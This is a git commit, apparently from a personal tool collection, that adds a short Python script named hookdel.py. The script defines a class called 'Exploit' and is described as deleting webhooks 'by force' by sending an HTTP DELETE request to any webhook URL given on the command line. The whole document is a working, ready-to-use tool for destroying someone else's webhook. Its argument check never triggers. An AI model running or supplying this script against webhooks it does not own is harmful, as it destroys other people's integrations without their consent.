d8012c46a22b7e7753dfcfc405a0339a131d7708
Vexvain <60254325+Vexvain@users.noreply.github.com>
2021-01-02 15:48:27 -0500

    Create hookdel.py

---
+++ Collection/hookdel.py
@@ -0,0 +1,30 @@
+# Delete webhooks by force
+
+import requests
+import sys
+
+class Exploit:
+
+    def __init__(self, url):
+        self.webhook_url = url
+
+
+    def execute(self):
+        """ send DELETE request to webhook url """
+        return requests.delete(self.webhook_url)
+
+    
+def main():
+    if len(sys.argv) < 1:
+        print(f'Usage: py {sys.argv[0]} <webhook url>')
+        sys.exit()
+
+    webhook_url = sys.argv[1]
+
+    exploit = Exploit(webhook_url)
+
+    exploit.execute()
+
+
+if __name__ == '__main__':
+    main()
